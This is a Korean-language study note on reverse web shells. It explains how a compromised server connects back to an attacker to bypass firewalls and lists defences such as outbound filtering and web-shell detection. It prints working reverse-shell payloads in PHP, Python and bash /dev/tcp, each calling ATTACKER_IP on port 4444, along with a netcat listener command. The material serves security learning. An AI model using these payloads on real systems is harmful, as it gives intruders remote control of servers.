# Reverse Web Shell

`Reverse Web Shell`은 공격자가 서버에 업로드한 웹쉘을 통해 **서버가 공격자에게 연결을 시도**하도록 만들어, 공격자가 **원격에서 명령을 실시간으로 주고받을 수 있는 쉘 환경을 확보**하는 공격 기법이다.<br>

기존의 일반 웹쉘은 클라이언트가 서버에 명령을 요청하는 방식(Pull)이라면, **리버스 웹쉘은 서버가 공격자에게 연결을 Initiate(Push)** 하므로 **방화벽, 보안 장비 우회를 위한 주요 기술**로 사용된다.

---

## 작동 원리
1. **공격자가 웹쉘을 포함한 파일을 서버에 업로드**
2. **웹쉘 내부에서 `bash`, `python`, `nc`, `php`, `perl` 등으로 지정된 공격자의 IP:Port로 연결 시도**
3. **공격자는 해당 포트를 리슨(listen) 상태로 유지하여 연결 대기**
4. **서버가 공격자에게 연결되면 양방향 명령어 전송이 가능한 인터랙티브 셸이 형성됨**

---

## 리버스 웹쉘 업로드 예시

### PHP 리버스 웹쉘

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

### Python 리버스 웹쉘

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Netcat 리버스 연결 (서버 측 쉘)
```bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```
>  공격자는 `nc -lvp 4444` 로 리슨 상태를 유지

---

## 일반 웹쉘 vs 리버스 웹쉘

| 구분       | 일반 웹쉘               | 리버스 웹쉘                 |
| -------- | ------------------- | ---------------------- |
| 연결 방향    | 공격자 → 서버 (요청 기반)    | 서버 → 공격자 (연결 시도 기반)    |
| 우회 가능성   | 낮음 (WAF/로그에 쉽게 탐지됨) | 높음 (내부 → 외부 연결로 우회 가능) |
| 명령 전송 방식 | 요청마다 명령 실행          | 실시간 쉘 유지 가능            |
| 방화벽 우회   | 어려움                 | 가능 (출력 포트 열려 있으면)      |


---

## 방어 방법

| 방어 방법             | 설명                                           |
| ----------------- | -------------------------------------------- |
| **아웃바운드 연결 제한**   | 서버에서 외부 IP로 나가는 연결 차단 (`iptables`, `ufw`)    |
| **실행 권한 제한**      | 웹서버가 `bash`, `nc`, `python` 등을 실행할 수 없도록 설정  |
| **웹쉘 탐지 도구 사용**   | 웹쉘 특유의 코드 패턴을 탐지하는 `LMD`, `ClamAV`, `WAF` 설정 |
| **파일 업로드 필터링 강화** | 웹쉘 파일 업로드 자체를 막기 (확장자, MIME, 재인코딩)           |
| **로그 모니터링**       | 갑작스러운 외부 IP 접속, outbound 연결 기록 분석            |


---
## 정리

> `Reverse Web Shell`은 공격자가 서버에 명령을 요청하는 것이 아니라, 서버가 공격자에게 접속하여 **양방향 통신이 가능한 실시간 쉘**을 형성하는 공격 방식이다.<br>

> 방화벽, WAF 등 보안 시스템을 우회하거나 내부망의 취약 서버를 활용한 **외부 제어의 핵심 수단**이 되며, **실행 파일 및 아웃바운드 보안 정책이 제대로 설정되어 있지 않다면 매우 위험한 결과로 이어질 수 있다.**

## 참고 사이트
>[SegaFalut Academy](https://academy.segfaulthub.com/ "nomaltic 해킹 강의")

<hr />